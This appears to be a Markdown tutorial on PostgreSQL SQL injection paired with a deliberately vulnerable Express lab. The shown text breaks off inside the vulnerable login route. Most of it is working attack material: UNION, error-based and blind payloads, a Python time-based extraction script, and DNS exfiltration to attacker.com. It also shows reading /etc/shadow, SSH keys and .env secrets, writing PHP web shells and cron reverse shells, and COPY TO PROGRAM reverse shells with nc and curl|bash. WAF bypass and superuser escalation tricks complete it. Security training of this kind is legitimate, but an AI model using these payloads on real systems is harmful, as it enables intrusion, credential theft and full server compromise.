# 🐘 PostgreSQL Injection — Complete Notes + MERN Lab

### Every technique explained deeply + Node.js/Express lab you run right now

> **You already know:** SQL Injection basics from the previous notes.
> **This file covers:** PostgreSQL-specific syntax, unique features, file read/write, and RCE.
> **Why PostgreSQL matters:** Many production apps use PostgreSQL (Heroku default, Supabase, Railway, Render all use it).

---

## 📚 Table of Contents

1. [PostgreSQL vs MySQL — Key Differences](#1-postgresql-vs-mysql-differences)
2. [PostgreSQL Comments](#2-postgresql-comments)
3. [PostgreSQL Enumeration — Map the Database](#3-postgresql-enumeration)
4. [PostgreSQL Methodology — Step by Step Attack](#4-postgresql-methodology)
5. [Error Based Injection — PostgreSQL Style](#5-error-based-injection)
6. [XML Helpers — Dump Everything at Once](#6-xml-helpers)
7. [Blind Injection in PostgreSQL](#7-blind-injection)
8. [Time Based Injection — pg_sleep](#8-time-based-injection)
9. [Out of Band — DNS Exfiltration](#9-out-of-band)
10. [Stacked Queries](#10-stacked-queries)
11. [File Read — Read Server Files!](#11-file-read)
12. [File Write — Write to Server!](#12-file-write)
13. [Command Execution — RCE via COPY PROGRAM](#13-command-execution)
14. [WAF Bypass — PostgreSQL Tricks](#14-waf-bypass)
15. [Privilege Checking](#15-privilege-checking)
16. [MERN Lab — Full Express + PostgreSQL Lab](#16-mern-lab)
17. [Testing Cheatsheet](#17-testing-cheatsheet)
18. [Defense](#18-defense)

---

## 1. PostgreSQL vs MySQL — Key Differences

Before diving in, understand HOW PostgreSQL is different from MySQL.
This matters because payloads that work on MySQL often fail on PostgreSQL!

```
FEATURE              MySQL                  PostgreSQL
─────────────────────────────────────────────────────────────────────
String concat        CONCAT(a,b)            a||b  or CONCAT(a,b)
Type casting         implicit               EXPLICIT: CAST(x AS type) or x::type
Version              version()              version() — different output format
Sleep function       SLEEP(5)               pg_sleep(5)
Limit syntax         LIMIT 0,10             LIMIT 10 OFFSET 0
Error extraction     extractvalue()         CAST to numeric
Execute OS commands  requires UDF           COPY TO PROGRAM (built-in!)
Read files           LOAD_FILE()            pg_read_file() or COPY FROM
Superuser variable   @@global.secure_file   usesuper in pg_user
Comments             --, #, /**/            --, /**/  (NO # comment!)
String from number   CHAR(65)               CHR(65)
Dollar quotes        N/A                    $TAG$string$TAG$ (bypass quotes!)
```

### Why PostgreSQL is More Dangerous When Vulnerable

```
MySQL:   Limited to reading SQL data (usually)
         OS commands need special setup (UDF = User Defined Functions)

PostgreSQL: Can read ANY file on server (pg_read_file)
            Can write files to server (COPY TO)
            Can execute OS commands (COPY TO PROGRAM) — built-in!
            Can get reverse shell!

If you find SQL injection in a PostgreSQL app as superuser:
→ You can potentially take over the ENTIRE server, not just the database!
```

---

## 2. PostgreSQL Comments

This is simple but CRITICAL — PostgreSQL does NOT support `#` as a comment!

```sql
-- ✅ Single line comment (works in PostgreSQL):
SELECT * FROM users -- this is ignored
SELECT * FROM users --

-- ✅ Multi-line comment (works in PostgreSQL):
SELECT * FROM /* this is ignored */ users

-- ❌ DOES NOT WORK in PostgreSQL (works in MySQL):
SELECT * FROM users # this does NOT work in PostgreSQL!
```

### Why This Matters in Attacks

```bash
# MySQL payload that works:
username=admin'#

# PostgreSQL — this FAILS (# is not a comment!):
username=admin'#

# PostgreSQL — use -- instead:
username=admin'--

# Test if target is PostgreSQL by using # and seeing if it fails:
?id=1'#   →  if error = PostgreSQL!
?id=1'--  →  if works = probably PostgreSQL or MySQL
```

---

## 3. PostgreSQL Enumeration

### After finding injection, enumerate the database

These queries tell you everything about the database structure:

```sql
-- ═══ BASIC INFO ═══════════════════════════════════════════════

-- PostgreSQL version (more detailed than MySQL)
SELECT version();
-- Output: "PostgreSQL 14.5 on x86_64-pc-linux-gnu, compiled by gcc..."

-- Current database name
SELECT CURRENT_DATABASE();
-- Output: "myapp"

-- Current schema (like "namespace" in PostgreSQL)
SELECT CURRENT_SCHEMA();
-- Output: "public"

-- ═══ USERS ════════════════════════════════════════════════════

-- List all PostgreSQL users
SELECT usename FROM pg_user;

-- ⚡ DANGEROUS: List users WITH password hashes!
SELECT usename, passwd FROM pg_shadow;
-- pg_shadow contains MD5 hashed passwords!
-- passwd format: "md5" + MD5(password + username)
-- Can crack with hashcat: hashcat -m 10000 hash.txt wordlist.txt

-- List only superusers (admin users)
SELECT usename FROM pg_user WHERE usesuper IS TRUE;

-- Who am I right now?
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();

-- ═══ AM I A SUPERUSER? ════════════════════════════════════════
-- Critical check — superuser = can read files, execute commands!
SHOW is_superuser;
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
-- If any returns 'on' or true → SUPERUSER = maximum danger!
```

---

## 4. PostgreSQL Methodology

### Step-by-Step Attack Process

Once you confirm injection, follow this order:

```sql
-- STEP 1: Get database info
SELECT CURRENT_DATABASE();
SELECT version();

-- STEP 2: List all schemas (namespaces)
SELECT DISTINCT(schemaname) FROM pg_tables;
-- Default: 'public', 'pg_catalog', 'information_schema'
-- Look for custom schemas: 'app', 'finance', 'internal', etc.

-- STEP 3: List all tables
SELECT table_name FROM information_schema.tables;
-- Too many results! Filter by schema:
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
-- OR:
SELECT tablename FROM pg_tables WHERE schemaname='public';

-- STEP 4: List columns of interesting table
SELECT column_name FROM information_schema.columns WHERE table_name='users';
-- Also get data types:
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';

-- STEP 5: Extract data
SELECT username, password, email FROM users;
SELECT username, password FROM users WHERE role='admin' LIMIT 1;

-- STEP 6: List all databases on this PostgreSQL server
SELECT datname FROM pg_database;
-- Shows: myapp, postgres, template0, template1
-- Can you access other databases? Maybe sensitive ones!

-- STEP 7: Check YOUR privileges
SELECT * FROM information_schema.role_table_grants
WHERE grantee = current_user
AND table_schema NOT IN ('pg_catalog', 'information_schema');
-- Shows what tables you can SELECT, INSERT, UPDATE, DELETE on
```

### In-Injection Format (URL Query)

```
-- If injection is in GET parameter ?id=1:

Step 1: ' UNION SELECT CURRENT_DATABASE(),NULL--
Step 2: ' UNION SELECT schemaname,NULL FROM pg_tables LIMIT 1--
Step 3: ' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0--
Step 4: ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0--
Step 5: ' UNION SELECT username,password FROM users LIMIT 1 OFFSET 0--
```

---

## 5. Error Based Injection

### PostgreSQL's CAST Trick

PostgreSQL is STRICT about types. If you try to cast a string to a number, it FAILS and shows you the string in the error!

```sql
-- The magic:
SELECT CAST('hello' AS INTEGER);
-- ERROR: invalid input syntax for type integer: "hello"
--                                                ↑↑↑↑↑
--                              The string appears IN the error!

-- So if we inject a query as the string:
SELECT CAST((SELECT version()) AS INTEGER);
-- ERROR: invalid input syntax for type integer: "PostgreSQL 14.5 on x86_64..."
--                                                ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
--                                          Version leaked in error!
```

### Error Based Payloads

```sql
-- Basic version extraction:
AND 1=CAST((SELECT version()) AS INT)--
-- Error reveals: "PostgreSQL 14.5 on x86_64-pc-linux-gnu..."

-- With tilde delimiters to make it easier to read:
AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC)--
-- Error reveals: "~PostgreSQL 14.5...~"
-- The ~ markers show exactly where your data is!

-- Current database:
AND 1=CAST((SELECT CURRENT_DATABASE()) AS INT)--

-- Get table names:
AND 1=CAST((SELECT table_name FROM information_schema.tables
            WHERE table_schema='public' LIMIT 1 OFFSET 0) AS INT)--
-- Change OFFSET 0 → 1 → 2 to get each table

-- Get columns:
AND 1=CAST((SELECT column_name FROM information_schema.columns
            WHERE table_name='users' LIMIT 1 OFFSET 0) AS INT)--

-- Get actual data:
AND 1=CAST((SELECT password FROM users LIMIT 1 OFFSET 0) AS INT)--

-- Combine multiple values with separator:
AND 1=CAST((SELECT CONCAT(usename,':',passwd) FROM pg_shadow LIMIT 1) AS INT)--
-- Error: "admin:md5f2477a144dff4f216ab81f2ac3e3207d"
```

### Error Injection in Different SQL Positions

```sql
-- In WHERE clause (most common):
' AND 1=CAST((SELECT version()) AS INT)--

-- In URL parameter (encoded):
?id=1 AND 1=CAST((SELECT version()) AS INT)--

-- Using alternate syntax:
' AND (SELECT version())::int=1--
-- ::int is PostgreSQL's shorthand for CAST(x AS INTEGER)

-- Nested in string comparison:
' and 1=cast((SELECT concat('DB:',current_database())) as int) and '1'='1

-- Extract multiple items with OFFSET iteration:
-- First table:  LIMIT 1 OFFSET 0
-- Second table: LIMIT 1 OFFSET 1
-- Third table:  LIMIT 1 OFFSET 2
```

---

## 6. XML Helpers — Dump Everything at Once

### The Magic of query_to_xml

PostgreSQL has a built-in function `query_to_xml()` that runs ANY query and returns ALL results as a single XML value!

Why is this useful for injection?

- Normally you need `LIMIT 1` to get one result
- With `query_to_xml`, you get ALL results in one go!
- Makes data extraction much faster

```sql
-- Dump ALL users in one request:
SELECT query_to_xml('SELECT * FROM users', true, true, '');

-- Output (all users in XML format):
-- <row><id>1</id><username>alice</username><password>hash1</password>...</row>
-- <row><id>2</id><username>bob</username><password>hash2</password>...</row>
-- ALL ROWS IN ONE REQUEST!

-- Dump the ENTIRE current database as XML:
SELECT database_to_xml(true, true, '');
-- Returns: every table, every row, every column!

-- Dump database schema:
SELECT database_to_xmlschema(true, true, '');
-- Returns: complete schema definition
```

### Using XML in Error Based Injection

```sql
-- Combine XML with CAST error trick to dump all users in one error:
AND 1=CAST(
  (SELECT query_to_xml('SELECT username,password FROM users', true, true, ''))
  AS INTEGER
)--

-- Error contains: entire users table as XML in one shot!
-- Much faster than extracting one row at a time
```

### Warning About XML Functions

```
query_to_xml → fine for small tables
database_to_xml → DANGEROUS on large databases!
  This loads the ENTIRE database into memory
  On big databases → server crash (DoS!)
  Only use on small test databases
```

---

## 7. Blind Injection

### When You Can't See Errors

If the app hides errors and shows no output, use blind injection.
PostgreSQL's SUBSTRING is the tool:

```sql
-- Check if version starts with 'PostgreSQL':
' AND SUBSTR(version(),1,10) = 'PostgreSQL' AND '1'='1--
-- If TRUE → page loads normally
-- If FALSE → page changes / empty

-- Alternative substring functions (all equivalent):
SUBSTR('string', start, length)
SUBSTRING('string', start, length)
SUBSTRING('string' FROM start FOR length)

-- Examples:
SUBSTR(version(),1,10) = 'PostgreSQL'   -- TRUE (version starts with PostgreSQL)
SUBSTR(version(),1,5)  = 'MySQL'        -- FALSE (it's PostgreSQL, not MySQL)
```

### Step by Step Data Extraction

```sql
-- Extract current database name character by character:

-- Step 1: Get length
' AND LENGTH(CURRENT_DATABASE()) = 6 AND '1'='1--
-- Try 1,2,3,4,5,6... until TRUE → database name is 6 chars

-- Step 2: Get each character
' AND SUBSTR(CURRENT_DATABASE(),1,1) = 'm' AND '1'='1--  -- TRUE? First char is 'm'
' AND SUBSTR(CURRENT_DATABASE(),2,1) = 'y' AND '1'='1--  -- TRUE? Second char is 'y'
-- Continue until full name: "myapp"

-- Faster with ASCII and binary search:
' AND ASCII(SUBSTR(CURRENT_DATABASE(),1,1)) > 64 AND '1'='1--
-- ASCII 64 = '@', so >64 means it's a letter or something after '@'
' AND ASCII(SUBSTR(CURRENT_DATABASE(),1,1)) > 96 AND '1'='1--
-- ASCII 96 = '`', so >96 means lowercase letter (a-z = 97-122)
' AND ASCII(SUBSTR(CURRENT_DATABASE(),1,1)) = 109 AND '1'='1--
-- ASCII 109 = 'm' → first char confirmed!

-- Extract password from users table:
' AND SUBSTR((SELECT password FROM users WHERE username='admin' LIMIT 1),1,1)='h' AND '1'='1--
```

---

## 8. Time Based Injection

### pg_sleep — PostgreSQL's Sleep Function

```sql
-- Basic: delay 5 seconds if injection works
SELECT pg_sleep(5);
'; SELECT pg_sleep(5)--
||(SELECT pg_sleep(5))

-- Conditional: sleep ONLY if something is true
-- "If database name starts with 'm', sleep 5 seconds"
SELECT CASE
  WHEN SUBSTR(CURRENT_DATABASE(),1,1)='m'  -- condition
  THEN pg_sleep(5)                          -- sleep if TRUE
  ELSE pg_sleep(0)                          -- no sleep if FALSE
END;

-- In injection context:
' AND (SELECT CASE
  WHEN SUBSTR(CURRENT_DATABASE(),1,1)='m'
  THEN pg_sleep(5)
  ELSE pg_sleep(0)
END) IS NOT NULL--
```

### Practical Time-Based Extraction

```sql
-- Extract database name character by character using timing:
select case when substring(datname,1,1)='m' then pg_sleep(5) else pg_sleep(0) end
from pg_database limit 1
-- Wait 5 seconds → first char of first database name is 'm'!

-- Extract table names:
select case when substring(table_name,1,1)='u' then pg_sleep(5) else pg_sleep(0) end
from information_schema.tables limit 1
-- 5 second delay → first table starts with 'u' (maybe 'users')

-- Extract column values:
select case when substring(password,1,1)='h' then pg_sleep(5) else pg_sleep(0) end
from users where username='admin' limit 1

-- Alternative timing methods (for when pg_sleep is filtered):
-- Heavy computation instead of sleep:
AND [RANDOM]=(SELECT [RANDOM] FROM PG_SLEEP([SECONDS]))
AND 1=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))
-- GENERATE_SERIES creates 5 million rows → takes time to compute!
```

### Timing Attack Script

```python
# time_based_sqli.py
# Extract data using timing in PostgreSQL
# Run this against your lab: python3 time_based_sqli.py

import requests
import time
import string

BASE_URL = "http://localhost:5000/api/vuln/pg/time"
SLEEP_SECONDS = 3
THRESHOLD = 2.5  # If response takes > 2.5s → condition was TRUE

def check_condition(condition):
    """
    Returns True if the injected condition caused a delay.
    Uses: ' AND (SELECT CASE WHEN [condition] THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NOT NULL--
    """
    payload = f"1 AND (SELECT CASE WHEN {condition} THEN pg_sleep({SLEEP_SECONDS}) ELSE pg_sleep(0) END) IS NOT NULL--"

    try:
        start = time.time()
        requests.get(BASE_URL, params={'id': payload}, timeout=30)
        elapsed = time.time() - start

        if elapsed > THRESHOLD:
            print(f"  ✓ TRUE  (took {elapsed:.1f}s) — condition: {condition}")
            return True
        else:
            print(f"  ✗ FALSE (took {elapsed:.1f}s) — condition: {condition}")
            return False
    except requests.Timeout:
        return True  # Timeout itself means sleep happened

def extract_string(sql_expression, max_length=30):
    """Extract a string value using time-based injection."""
    result = ""
    print(f"\n[*] Extracting: {sql_expression}")

    for pos in range(1, max_length + 1):
        found_char = False

        # Binary search across printable ASCII (32-126)
        low, high = 32, 126

        while low <= high:
            mid = (low + high) // 2
            condition = f"ASCII(SUBSTR(({sql_expression}),{pos},1)) > {mid}"

            if check_condition(condition):
                low = mid + 1
            else:
                # Check exact match
                exact = f"ASCII(SUBSTR(({sql_expression}),{pos},1)) = {mid}"
                if check_condition(exact):
                    result += chr(mid)
                    print(f"  → Position {pos}: '{chr(mid)}' | So far: '{result}'")
                    found_char = True
                    break
                else:
                    high = mid - 1

        if not found_char:
            print(f"  → End of string at position {pos}")
            break

    return result


print("=" * 50)
print("PostgreSQL Time-Based SQL Injection Extractor")
print("=" * 50)

# Extract database name
db_name = extract_string("SELECT CURRENT_DATABASE()")
print(f"\n[+] Database name: {db_name}")

# Extract first table name
table = extract_string("SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1")
print(f"\n[+] First table: {table}")

# Extract admin password
password = extract_string(f"SELECT password FROM {table} WHERE role='admin' LIMIT 1")
print(f"\n[+] Admin password: {password}")
```

---

## 9. Out of Band

### DNS Exfiltration

When output is completely blind AND timing is unreliable:

```sql
-- Method: Make PostgreSQL do a DNS lookup to YOUR server
-- YOUR server logs show the lookup = data extracted in subdomain!

-- Full procedure:
DO $$
DECLARE
  p text;
  c text;
BEGIN
  -- Get the data you want to extract
  SELECT INTO p (SELECT passwd FROM pg_shadow WHERE usename='postgres' LIMIT 1);

  -- Build command: nslookup [data].your-server.com
  c := 'copy (SELECT '''') to program ''nslookup ' || p || '.attacker.com''';

  -- Execute it!
  EXECUTE c;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

SELECT f();
```

### Using Burp Collaborator

```
1. Open Burp Suite
2. Go to: Burp menu → Burp Collaborator client
3. Click "Copy to clipboard" → get a unique domain like:
   abc123.burpcollaborator.net

4. Use in payload:
   COPY (SELECT '') TO PROGRAM 'nslookup abc123.burpcollaborator.net'

5. In Burp Collaborator panel → click "Poll now"
6. If DNS lookup appears → injection confirmed!

Exfiltrate data in subdomain:
   COPY (SELECT '') TO PROGRAM
   'nslookup '||(SELECT password FROM users LIMIT 1)||'.abc123.burpcollaborator.net'

Result in Collaborator:
   DNS lookup from: hash5f4dcc3b5aa765d61d8327deb882cf99.abc123.burpcollaborator.net
   ← Password hash is in the subdomain!
```

---

## 10. Stacked Queries

### Running Multiple Queries

PostgreSQL supports stacked (multiple) queries separated by semicolon:

```sql
-- Run TWO queries in one injection:
SELECT 1; CREATE TABLE hacked(data TEXT);--

-- This creates a new table in the database!
SELECT 1; DROP TABLE important_data;--

-- Insert a backdoor user:
SELECT 1; INSERT INTO users(username,password,role) VALUES('backdoor','password','admin');--

-- With injection:
?id=1; CREATE TABLE shell_test(output TEXT);--
```

### Why This is Dangerous

```
Normal SQL injection: can only READ data
Stacked queries: can WRITE, DELETE, CREATE, DROP!

If stacked queries work:
→ Create backdoor admin accounts
→ Delete logs
→ Create tables for data storage
→ Potentially trigger command execution (see next section)
```

---

## 11. File Read

### Reading Server Files from SQL Injection!

If you have superuser privileges in PostgreSQL, you can read ANY file the PostgreSQL process can access.

```sql
-- ═══ METHOD 1: pg_read_file (simplest) ═════════════════════════

-- List files in PostgreSQL data directory:
SELECT pg_ls_dir('./');
-- Shows: PG_VERSION, pg_hba.conf, postgresql.conf, etc.

-- Read a file (relative path from PostgreSQL data directory):
SELECT pg_read_file('PG_VERSION', 0, 200);
-- Output: "14\n" (PostgreSQL version)

-- Read config files:
SELECT pg_read_file('pg_hba.conf', 0, 4096);
-- Output: authentication config — shows what users/hosts can connect!

-- Newer PostgreSQL versions allow absolute paths:
SELECT pg_read_file('/etc/passwd', 0, 4096);
-- VERY DANGEROUS: shows all user accounts on the server!

-- ═══ METHOD 2: COPY FROM (more compatible) ════════════════════

-- Create a temporary table to hold file contents:
CREATE TABLE file_reader(content TEXT);

-- Copy file into table:
COPY file_reader FROM '/etc/passwd';

-- Read it:
SELECT * FROM file_reader LIMIT 5 OFFSET 0;

-- Read /etc/shadow (password hashes! — usually needs root):
COPY file_reader FROM '/etc/shadow';

-- Clean up:
DROP TABLE file_reader;

-- ═══ METHOD 3: lo_import (Large Objects) ═══════════════════════

-- Import file as a "large object" (binary):
SELECT lo_import('/etc/passwd');
-- Returns an OID number like: 16420

-- Read it using OID:
SELECT lo_get(16420);
-- Returns raw bytes of the file

-- Or read ALL large objects:
SELECT * FROM pg_largeobject;
```

### What Files Are Interesting?

```
/etc/passwd             → List of all users on the server
/etc/shadow             → Password hashes (if PostgreSQL runs as root!)
/etc/postgresql/*/main/pg_hba.conf  → Who can connect to PostgreSQL
/proc/self/environ      → Environment variables (may have secrets/API keys!)
~/.bash_history         → Command history
~/.ssh/id_rsa           → SSH private key → login to server!
/var/www/html/.env      → Application .env file → DB passwords, JWT secrets, API keys!
/etc/nginx/nginx.conf   → Web server config
/etc/apache2/sites-enabled/*  → Apache vhosts
app source code files   → Look for hardcoded credentials
```

---

## 12. File Write

### Writing Files to the Server!

With superuser access, PostgreSQL can WRITE files too:

```sql
-- ═══ METHOD 1: COPY TO ════════════════════════════════════════

-- Write a file with custom content:
COPY (SELECT 'Hello World') TO '/tmp/test.txt';

-- Write a backdoor bash script:
COPY (SELECT 'nc -lvvp 4444 -e /bin/bash') TO '/tmp/backdoor.sh';
-- Now execute: COPY shell FROM PROGRAM 'bash /tmp/backdoor.sh'

-- Write a PHP web shell (if web root is accessible):
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
-- Now visit: http://target.com/shell.php?cmd=whoami
-- → Remote code execution via web shell!

-- Write a cron job (execute every minute):
COPY (SELECT '* * * * * postgres bash -i >& /dev/tcp/attacker.com/4444 0>&1')
TO '/var/spool/cron/crontabs/postgres';
-- Reverse shell every minute!

-- ═══ METHOD 2: lo_from_bytea (Large Objects) ════════════════

-- Create a large object with specific OID:
SELECT lo_from_bytea(43210, decode('nc -lvvp 4444 -e /bin/bash', 'escape'));

-- Append more data to it:
SELECT lo_put(43210, 20, 'more content here');

-- Export to file:
SELECT lo_export(43210, '/tmp/reverse_shell.sh');

-- ═══ MULTI-LINE CONTENT ═══════════════════════════════════════

-- Method for multi-line file writes:
CREATE TABLE write_file(t TEXT);
INSERT INTO write_file(t) VALUES('#!/bin/bash');
INSERT INTO write_file(t) VALUES('bash -i >& /dev/tcp/192.168.1.10/4444 0>&1');
COPY write_file(t) TO '/tmp/shell.sh';
DROP TABLE write_file;
```

---

## 13. Command Execution — RCE!

### The Most Dangerous PostgreSQL Feature

`COPY TO/FROM PROGRAM` executes OS commands directly!
This is a LEGITIMATE PostgreSQL feature for data import/export.
But in injection → Remote Code Execution!

**Requirements:** PostgreSQL 9.3+ AND superuser privileges

```sql
-- ═══ TEST: Do you have command execution? ═══════════════════════

-- Simple test (DNS callback confirms it works):
COPY (SELECT '') TO PROGRAM 'nslookup attacker.com';

-- Or confirm with timing:
COPY (SELECT '') TO PROGRAM 'sleep 5';
-- If response delayed 5 seconds → command execution works!

-- ═══ INFORMATION GATHERING ═══════════════════════════════════

-- Who is PostgreSQL running as?
CREATE TABLE cmd_output(output TEXT);
COPY cmd_output FROM PROGRAM 'whoami';
SELECT * FROM cmd_output;
-- Output: "postgres" (or sometimes "root"!)
DROP TABLE cmd_output;

-- Get hostname:
COPY cmd_output FROM PROGRAM 'hostname';
SELECT * FROM cmd_output;

-- Get network interfaces:
COPY cmd_output FROM PROGRAM 'ip addr';
SELECT * FROM cmd_output;

-- Read environment variables (API keys! JWT secrets!):
COPY cmd_output FROM PROGRAM 'env';
SELECT * FROM cmd_output;

-- ═══ REVERSE SHELL ════════════════════════════════════════════

-- Full reverse shell — connect back to attacker machine:
-- BEFORE running: start listener on YOUR machine:
-- nc -lvnp 4444

-- Then execute:
CREATE TABLE shell_table(output text);
COPY shell_table FROM PROGRAM 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.10 4444 > /tmp/f';
-- Replace 192.168.1.10 with your IP and 4444 with your port
-- This creates a full interactive shell on the attacker's machine!

-- ═══ USING libc.so.6 (Alternative Method) ═══════════════════

-- Create a custom SQL function that calls C system():
CREATE OR REPLACE FUNCTION system(cstring)
RETURNS int
AS '/lib/x86_64-linux-gnu/libc.so.6', 'system'
LANGUAGE 'c' STRICT;

-- Now call it like a normal SQL function:
SELECT system('whoami > /tmp/out.txt');
SELECT system('cat /etc/passwd | nc 192.168.1.10 4444');
SELECT system('curl http://192.168.1.10:8080/shell.sh | bash');
```

### RCE Escalation Path

```
SQL Injection Found
        ↓
Confirm PostgreSQL (error messages, version())
        ↓
Check superuser: SELECT current_setting('is_superuser');
        ↓
If superuser = YES:
        ↓
Read /etc/passwd, /proc/self/environ
        ↓
Test COPY TO PROGRAM:
COPY (SELECT '') TO PROGRAM 'sleep 5';
        ↓
If delayed = RCE confirmed!
        ↓
Get reverse shell:
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444>/tmp/f';
        ↓
Full server compromise!
```

---

## 14. WAF Bypass

### Alternative to Quotes

PostgreSQL has unique ways to write strings without using quote characters:

```sql
-- ═══ CHR() Function ═══════════════════════════════════════════

-- Instead of: 'admin'
-- Use: CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
-- a=97, d=100, m=109, i=105, n=110

SELECT username FROM users WHERE username = CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);
-- Equivalent to: WHERE username = 'admin'
-- No quotes at all!

-- Convert 'admin' to CHR():
SELECT CHR(65)||CHR(66)||CHR(67);
-- Output: "ABC"

-- ═══ Dollar-Sign Quoting ═════════════════════════════════════

-- PostgreSQL supports dollar-sign quotes: $TAG$content$TAG$
-- Content inside can contain single quotes!

-- Normal: WHERE username = 'admin'
-- Dollar: WHERE username = $BYPASSED$admin$BYPASSED$

-- Also works as:
WHERE username = $$admin$$
-- $$ with empty tag = shorthand dollar quote

-- No single quotes = many WAFs can't detect SQL!

-- ═══ Type Casting Variations ═════════════════════════════════

-- Different ways to cast in PostgreSQL:
CAST('admin' AS TEXT)
'admin'::TEXT
TEXT 'admin'

-- WAF might block CAST but not ::
' UNION SELECT username::text, password::text FROM users--

-- ═══ Combining Bypass Techniques ═════════════════════════════

-- WAF blocks: SELECT, FROM, WHERE
-- Try URL encoding:
%53ELECT  (S encoded)
%46ROM    (F encoded)

-- Try comment injection in keywords (MySQL trick, sometimes PostgreSQL):
SE/**/LECT

-- Newline in keyword:
SE
LECT

-- Hex encoding for strings:
SELECT encode('admin'::bytea, 'hex');
-- Use result to bypass string filters
```

---

## 15. Privilege Checking

### Always Check These First After Finding Injection

```sql
-- ═══ Am I Superuser? ═══════════════════════════════════════════

SHOW is_superuser;
-- Output: "on" = YES, "off" = NO

SELECT current_setting('is_superuser');
-- Output: "on" or "off"

SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
-- Output: t (true) or f (false)

-- ═══ What Tables Can I Access? ═══════════════════════════════

SELECT table_name, privilege_type
FROM information_schema.role_table_grants
WHERE grantee = current_user
AND table_schema NOT IN ('pg_catalog', 'information_schema');
-- Shows: which tables + what operations (SELECT/INSERT/UPDATE/DELETE)

-- ═══ What Functions Can I Execute? ═══════════════════════════

SELECT routine_name
FROM information_schema.routine_privileges
WHERE grantee = current_user;
-- Includes: lo_import, lo_export, pg_read_file, etc.
-- If these appear = file operations possible!

-- ═══ Escalate Privileges (if you can run stacked queries) ════

-- If not superuser but have CREATEROLE:
GRANT superuser TO current_user;

-- Create a new superuser:
CREATE USER hacker WITH SUPERUSER PASSWORD 'hacked123';

-- Give current user superuser:
ALTER USER current_user SUPERUSER;
```

---

## 16. MERN Lab — Full Express + PostgreSQL Lab

### Setup

```bash
# Create lab directory
mkdir postgresql-lab && cd postgresql-lab
npm init -y
npm install express pg dotenv cors

# Create .env
cat > .env << 'EOF'
PORT=5000
PG_HOST=localhost
PG_PORT=5432
PG_USER=postgres
PG_PASSWORD=yourpassword
PG_DATABASE=pglab
EOF
```

### Database Setup

```sql
-- Run in PostgreSQL (psql):
CREATE DATABASE pglab;
\c pglab

-- Users table
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(50) NOT NULL,
  email VARCHAR(100) NOT NULL,
  password VARCHAR(255) NOT NULL,
  role VARCHAR(20) DEFAULT 'user',
  ssn VARCHAR(15),
  balance NUMERIC(10,2) DEFAULT 0
);

-- Products table
CREATE TABLE products (
  id SERIAL PRIMARY KEY,
  name VARCHAR(100),
  price NUMERIC(10,2),
  category VARCHAR(50)
);

-- Secret table
CREATE TABLE secrets (
  id SERIAL PRIMARY KEY,
  key_name VARCHAR(100),
  key_value TEXT
);

-- Insert test data
INSERT INTO users VALUES
  (1, 'alice', 'alice@test.com', 'password123', 'user', '123-45-6789', 5000),
  (2, 'bob', 'bob@test.com', 'bobpass', 'user', '987-65-4321', 3000),
  (3, 'admin', 'admin@pglab.com', 'superSecret!', 'admin', NULL, 0);

INSERT INTO products VALUES
  (1, 'Laptop', 999.99, 'electronics'),
  (2, 'Phone', 599.99, 'electronics'),
  (3, 'Desk', 299.99, 'furniture');

INSERT INTO secrets VALUES
  (1, 'stripe_api_key', 'sk_live_abcdef123456789'),
  (2, 'jwt_secret', 'my_jwt_signing_secret'),
  (3, 'admin_password', 'superSecret!');

-- Create a non-superuser for testing (safer):
CREATE USER app_user WITH PASSWORD 'apppass';
GRANT CONNECT ON DATABASE pglab TO app_user;
GRANT SELECT, INSERT, UPDATE ON ALL TABLES IN SCHEMA public TO app_user;
```

### Server File

```javascript
// server.js
// HOW TO RUN: node server.js
// All vulnerable routes at: http://localhost:5000/api/vuln/
// All secure routes at:     http://localhost:5000/api/secure/

require('dotenv').config()
const express = require('express')
const { Pool } = require('pg')
const app = express()

app.use(express.json())
app.use(express.urlencoded({ extended: true }))

// PostgreSQL connection pool
const pool = new Pool({
  host: process.env.PG_HOST,
  port: process.env.PG_PORT,
  user: process.env.PG_USER,
  password: process.env.PG_PASSWORD,
  database: process.env.PG_DATABASE,
})

// Test connection
pool
  .connect()
  .then((c) => {
    console.log('✅ PostgreSQL connected')
    c.release()
  })
  .catch((err) => console.error('❌ PostgreSQL error:', err.message))

// ══════════════════════════════════════════════════════════════
// VULNERABLE ROUTES
// ══════════════════════════════════════════════════════════════

// VULNERABLE 1: Authentication Bypass
// TEST:
//   Normal: POST /api/vuln/login  Body: {"username":"alice","password":"password123"}
//   Attack: Body: {"username":"' OR '1'='1' LIMIT 1--","password":"x"}
//   Attack: Body: {"username":"admin'--","password":"anything"}

app.post('/api/vuln/login', async (req, res) => {
  const { username, password } = req.body

  // ❌ VULNERABLE: String concatenation in PostgreSQL!
  // Note: PostgreSQL uses || for concatenation, not CONCAT
  const query = `
    SELECT id, username, email, role
    FROM users
    WHERE username = '${username}'
    AND password = '${password}'
  `

  console.log('\n[VULN LOGIN] Query:', query)

  try {
    const result = await pool.query(query)

    if (result.rows.length > 0) {
      res.json({
        success: true,
        message: `Logged in as: ${result.rows[0].username} (${result.rows[0].role})`,
        user: result.rows[0],
        query_executed: query,
      })
    } else {
      res.status(401).json({
        success: false,
        message: 'Invalid credentials',
        query_executed: query,
      })
    }
  } catch (err) {
    // ❌ Exposes PostgreSQL error (useful for error-based injection!)
